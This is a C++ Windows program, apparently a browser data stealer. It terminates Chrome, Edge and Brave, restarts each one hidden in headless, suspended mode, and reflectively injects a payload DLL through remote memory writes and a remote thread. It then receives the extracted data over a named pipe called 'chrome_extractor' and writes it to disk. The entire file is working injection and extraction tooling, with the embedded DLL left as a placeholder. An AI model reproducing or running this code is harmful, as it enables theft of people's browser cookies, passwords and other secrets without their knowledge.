#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <algorithm>
#include <sstream>

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::vector<unsigned char> ret;

    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret.push_back(char_array_3[i]);
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }

    return ret;
}

const char* EMBEDDED_DLL_BASE64 = "BASE64_ENCODED_DLL";

struct BrowserConfig {
    const wchar_t* name;
    const wchar_t* exe_name;
    const wchar_t* common_paths[2];
};

const BrowserConfig BROWSERS[] = {
    { L"Chrome", L"chrome.exe", { L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe" } },
    { L"Edge", L"msedge.exe", { L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe" } },
    { L"Brave", L"brave.exe", { L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" } }
};

#include <shlobj.h>
std::wstring find_browser_exe(const std::wstring& name) {
    wchar_t local_app_data[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_app_data);

    for (const auto& config : BROWSERS) {
        std::wstring bname = config.name;
        std::transform(bname.begin(), bname.end(), bname.begin(), ::towlower);
        std::wstring target = name;
        std::transform(target.begin(), target.end(), target.begin(), ::towlower);

        if (bname == target) {
            for (const auto& path : config.common_paths) {
                if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES) {
                    return path;
                }
            }
            // Check LocalAppData fallback
            std::wstring local_path = local_app_data;
            if (target == L"chrome") local_path += L"\\Google\\Chrome\\Application\\chrome.exe";
            else if (target == L"edge") local_path += L"\\Microsoft\\Edge\\Application\\msedge.exe";
            else if (target == L"brave") local_path += L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";

            if (GetFileAttributesW(local_path.c_str()) != INVALID_FILE_ATTRIBUTES) {
                return local_path;
            }
        }
    }
    return L"";
}

void kill_processes_by_name(const wchar_t* exe_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, exe_name) == 0) {
                HANDLE h_process = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
                if (h_process) {
                    TerminateProcess(h_process, 0);
                    CloseHandle(h_process);
                }
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
}

struct DllInfo {
    void* base;
    HINSTANCE(WINAPI* load_library_a)(const char*);
    void*(WINAPI* get_proc_address)(HINSTANCE, const char*);
    bool relocation_required;
};

void WINAPI __attribute__((section(".text"))) realign_pe(DllInfo* dll_info) {
    void* base = dll_info->base;
    auto _LoadLibraryA = dll_info->load_library_a;
    auto _GetProcAddress = dll_info->get_proc_address;

    auto dos_header = (PIMAGE_DOS_HEADER)base;
    auto nt_headers = (PIMAGE_NT_HEADERS64)((size_t)base + dos_header->e_lfanew);

    if (dll_info->relocation_required) {
        auto reloc_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir->VirtualAddress != 0) {
            size_t delta = (size_t)base - (size_t)nt_headers->OptionalHeader.ImageBase;
            auto block_ptr = (PIMAGE_BASE_RELOCATION)((size_t)base + reloc_dir->VirtualAddress);

            while (block_ptr->SizeOfBlock >= 8 && block_ptr->VirtualAddress != 0) {
                size_t entry_count = (block_ptr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(unsigned short);
                auto entries = (unsigned short*)((size_t)block_ptr + sizeof(IMAGE_BASE_RELOCATION));

                for (size_t i = 0; i < entry_count; i++) {
                    unsigned short entry = entries[i];
                    unsigned short rel_type = entry >> 12;
                    unsigned short offset = entry & 0x0FFF;

                    if (rel_type == 10) { // IMAGE_REL_BASED_DIR64
                        auto patch = (size_t*)((size_t)base + block_ptr->VirtualAddress + offset);
                        *patch += delta;
                    }
                }
                block_ptr = (PIMAGE_BASE_RELOCATION)((size_t)block_ptr + block_ptr->SizeOfBlock);
            }
        }
    }

    auto import_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir->VirtualAddress != 0) {
        auto import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((size_t)base + import_dir->VirtualAddress);
        while (import_desc->Name != 0) {
            auto lib_name = (const char*)((size_t)base + import_desc->Name);
            HINSTANCE h_module = _LoadLibraryA(lib_name);

            auto oft = import_desc->OriginalFirstThunk;
            auto orig_thunk = (PIMAGE_THUNK_DATA64)((size_t)base + (oft ? oft : import_desc->FirstThunk));
            auto first_thunk = (PIMAGE_THUNK_DATA64)((size_t)base + import_desc->FirstThunk);

            while (orig_thunk->u1.AddressOfData != 0) {
                if (orig_thunk->u1.Ordinal & 0x8000000000000000) {
                    first_thunk->u1.Function = (size_t)_GetProcAddress(h_module, (const char*)(orig_thunk->u1.Ordinal & 0xFFFF));
                } else {
                    auto ibn = (PIMAGE_IMPORT_BY_NAME)((size_t)base + (size_t)orig_thunk->u1.AddressOfData);
                    first_thunk->u1.Function = (size_t)_GetProcAddress(h_module, (const char*)ibn->Name);
                }
                orig_thunk++;
                first_thunk++;
            }
            import_desc++;
        }
    }

    if (nt_headers->OptionalHeader.AddressOfEntryPoint != 0) {
        auto entry_point = (BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID))((size_t)base + nt_headers->OptionalHeader.AddressOfEntryPoint);
        entry_point((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    }
}

void WINAPI realign_pe_end() {}

bool inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
    if (dll_bytes.size() < sizeof(IMAGE_DOS_HEADER)) {
        std::cerr << "[-] DLL bytes too small" << std::endl;
        return false;
    }
    auto dos_header = (PIMAGE_DOS_HEADER)dll_bytes.data();
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "[-] Invalid DOS signature" << std::endl;
        return false;
    }
    auto nt_headers = (PIMAGE_NT_HEADERS64)((size_t)dll_bytes.data() + dos_header->e_lfanew);
    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "[-] Invalid NT signature" << std::endl;
        return false;
    }

    size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
    void* remote_base = VirtualAllocEx(h_process, (void*)nt_headers->OptionalHeader.ImageBase, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    bool relocation_required = false;
    if (!remote_base) {
        relocation_required = true;
        remote_base = VirtualAllocEx(h_process, NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    WriteProcessMemory(h_process, remote_base, dll_bytes.data(), nt_headers->OptionalHeader.SizeOfHeaders, NULL);

    auto section_header = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (section_header[i].PointerToRawData && section_header[i].SizeOfRawData) {
            WriteProcessMemory(h_process, (void*)((size_t)remote_base + section_header[i].VirtualAddress), (void*)((size_t)dll_bytes.data() + section_header[i].PointerToRawData), section_header[i].SizeOfRawData, NULL);
        }
    }

    HMODULE h_kernel32 = GetModuleHandleA("kernel32.dll");
    DllInfo dll_info = {
        remote_base,
        (HINSTANCE(WINAPI*)(const char*))GetProcAddress(h_kernel32, "LoadLibraryA"),
        (void*(WINAPI*)(HINSTANCE, const char*))GetProcAddress(h_kernel32, "GetProcAddress"),
        relocation_required
    };

    size_t bootstrapper_size = 4096; // Use a fixed safe size for the shellcode
    size_t total_size = sizeof(DllInfo) + bootstrapper_size;
    void* remote_mem = VirtualAllocEx(h_process, NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(h_process, remote_mem, &dll_info, sizeof(DllInfo), NULL);
    void* remote_code = (void*)((size_t)remote_mem + sizeof(DllInfo));
    WriteProcessMemory(h_process, remote_code, (void*)realign_pe, bootstrapper_size, NULL);

    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)remote_code, remote_mem, 0, NULL);
    if (h_thread) {
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
        return true;
    }
    std::cerr << "[-] Failed to create remote thread: " << GetLastError() << std::endl;
    return false;
}

void start_ipc_server(const std::wstring& browser_name) {
    const wchar_t* pipe_name = L"\\\\.\\pipe\\chrome_extractor";
    HANDLE h_pipe = CreateNamedPipeW(pipe_name, PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 65536, 65536, 0, NULL);

    if (h_pipe == INVALID_HANDLE_VALUE) return;

    if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
        std::vector<char> buffer;
        char temp[8192];
        DWORD bytes_read;
        while (ReadFile(h_pipe, temp, sizeof(temp), &bytes_read, NULL) && bytes_read > 0) {
            buffer.insert(buffer.end(), temp, temp + bytes_read);
        }

        if (!buffer.empty()) {
            std::wstring folder = browser_name;
            CreateDirectoryW(folder.c_str(), NULL);
            std::wstring out_path = folder + L"\\data.json";
            HANDLE h_file = CreateFileW(out_path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h_file != INVALID_HANDLE_VALUE) {
                DWORD written;
                WriteFile(h_file, buffer.data(), (DWORD)buffer.size(), &written, NULL);
                CloseHandle(h_file);
                std::wcout << L"Received and saved data for " << browser_name << std::endl;
            }
        }
    }
    CloseHandle(h_pipe);
}

int main(int argc, char* argv[]) {
    std::wstring browser = L"all";
    if (argc > 1) {
        std::string arg = argv[1];
        browser = std::wstring(arg.begin(), arg.end());
    }

    std::vector<unsigned char> dll_bytes = base64_decode(EMBEDDED_DLL_BASE64);
    if (dll_bytes.size() < 100) { // If placeholder or invalid
        std::cout << "[*] Embedded DLL not found or invalid, trying payload.dll..." << std::endl;
        HANDLE hFile = CreateFileA("payload.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD size = GetFileSize(hFile, NULL);
            dll_bytes.resize(size);
            DWORD read;
            ReadFile(hFile, dll_bytes.data(), size, &read, NULL);
            CloseHandle(hFile);
        }
    }

    if (dll_bytes.empty()) {
        std::cerr << "[-] No DLL bytes available for injection." << std::endl;
        return 1;
    }

    for (const auto& config : BROWSERS) {
        if (browser != L"all" && _wcsicmp(browser.c_str(), config.name) != 0) continue;

        std::wcout << L"[*] Processing " << config.name << std::endl;
        kill_processes_by_name(config.exe_name);

        std::wstring exe_path = find_browser_exe(config.name);
        if (exe_path.empty()) exe_path = config.exe_name;

        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = { 0 };

        std::wstring cmd = L"\"" + exe_path + L"\" --headless --disable-gpu";
        if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            if (inject_dll_reflective(pi.hProcess, dll_bytes)) {
                ResumeThread(pi.hThread);
                std::cout << "[+] Injected and resumed thread. Waiting for data..." << std::endl;
                start_ipc_server(config.name);
            } else {
                std::cerr << "[-] Injection failed for " << config.name << std::endl;
            }
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            std::cerr << "[-] Failed to start browser " << config.name << " at " << std::string(exe_path.begin(), exe_path.end()) << " Error: " << GetLastError() << std::endl;
        }
    }

    return 0;
}
